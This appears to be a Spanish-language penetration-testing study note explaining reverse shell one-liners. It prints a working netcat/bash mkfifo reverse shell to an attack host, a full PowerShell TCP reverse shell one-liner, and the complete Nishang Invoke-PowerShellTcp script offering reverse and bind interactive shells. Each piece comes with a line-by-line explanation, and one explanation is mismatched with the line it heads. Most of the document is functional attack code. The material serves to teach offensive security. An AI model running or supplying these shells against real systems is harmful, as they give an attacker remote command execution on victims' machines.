En seguridad de la información, el payload el comando y/o código que explota la vulnerabilidad en un sistema operativo y/o aplicación.

## One-Liners Examined
#### Netcat/Bash Reverse Shell One-liner
```js
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

==***rm -f /tmp/f;***== 
Elimina el archivo /tmp/f si existe, -f hace que rm ignore los archivos no existentes. El punto y coma (;) se utiliza para ejecutar el comando secuencialmente.

==***mkfifo /tmp/f;***==
Crea un archivo FIFO en la ubicación especificada. En este caso, /tmp/f es el archivo FIFO, el punto y coma (;) se utiliza para ejecutar el comando secuencialmente.

==***/bin/bash -i 2>&1 |***==
Especifica el intérprete del lenguaje de comandos utilizando la opción -i para asegurar que el shell es interactivo. 2>&1 garantiza que el flujo de datos de error estándar (2) y el flujo de datos de salida estándar (1) se redirijan al comando que sigue a la tubería (|).

==***nc 10.10.14.12 7777 > /tmp/f***==
Utiliza Netcat para enviar una conexión a nuestro host de ataque 10.10.14.12 escuchando en el puerto 7777. La salida será redirigida (>) a /tmp/f, sirviendo el shell Bash a nuestro oyente Netcat en espera cuando se ejecute el comando reverse shell one-liner.


## PowerShell One-liner Explained

```js
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**powershell -nop -c**
Ejecuta `powershell.exe` sin perfil ( `nop`) y ejecuta el bloque de comando/script ( `-c`) contenida entre las comillas. Este comando en particular se emite dentro del símbolo del sistema, razón por la cual PowerShell está al principio del comando. Es bueno saber cómo hacer esto si descubrimos una vulnerabilidad de ejecución remota de código que nos permite ejecutar comandos directamente en `cmd.exe`.

**"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);**
Establece/evalúa la variable `$client` igual a ( `=`) el `New-Object` cmdlet, que crea una instancia del `System.Net.Sockets.TCPClient`Objeto de marco .NET. El objeto .NET framework se conectará con el socket TCP que figura entre paréntesis `(10.10.14.158,443)`. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente.

**$stream = $client.GetStream();**
Establece/evalúa la variable `$stream` igual a ( `=`) el `$client`variable y el método de .NET framework llamado [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) que facilita las comunicaciones de red. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente.

**[byte[]]$bytes = 0..65535|%{0};**
Crea una matriz de tipo byte ( `[]`) llamado `$bytes`que devuelve 65.535 ceros como valores en la matriz. Se trata esencialmente de un flujo de bytes vacío que se dirigirá al escucha TCP en un cuadro de ataque que espera una conexión.

**while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)**
Comienza un `while` bucle que contiene el `$i` conjunto de variables igual a ( `=`) el marco .NET [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) ( `$stream.Read`) método. Los parámetros: buffer ( `$bytes`), compensar ( `0`), y contar ( `$bytes.Length`) se definen dentro de los paréntesis del método.

**{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);**
Establece/evalúa la variable `$data` igual a ( `=`) una [clase de marco .NET con codificación ASCII](https://en.wikipedia.org/wiki/ASCII) que se utilizará junto con el `GetString` método para codificar el flujo de bytes ( `$bytes`) en ASCII. En resumen, lo que escribamos no sólo se transmitirá y recibirá como bits vacíos, sino que se codificará como texto ASCII. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente.

**$sendback = (iex $data 2>&1 | Out-String )**
Establece/evalúa la variable `$sendback2` igual a ( `=`) el `$sendback` variable más ( `+`) la cadena PS ( `'PS'`) más `+` ruta al directorio de trabajo ( `(pwd).path`) más ( `+`) la cuerda `'> '`. Esto dará como resultado que el símbolo del shell sea PS C:\workingdirectoryofmachine >. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente. Recuerde que el operador + en programación combina cadenas cuando no se utilizan valores numéricos, con la excepción de ciertos lenguajes como C y C++ donde se necesitaría una función.

**$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}**
Establece/evalúa la variable `$sendbyte` igual a ( `=`) el flujo de bytes codificado en ASCII que utilizará un cliente TCP para iniciar una sesión de PowerShell con un oyente Netcat ejecutándose en el cuadro de ataque.

**$client.Close()**
Este es el [método TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) que se utilizará cuando finalice la conexión.

El resumen que acabamos de examinar juntos también se puede ejecutar en forma de script de PowerShell ( `.ps1`). Podemos ver un ejemplo de esto viendo el código fuente a continuación. Este código fuente es parte del [proyecto nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) :

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```


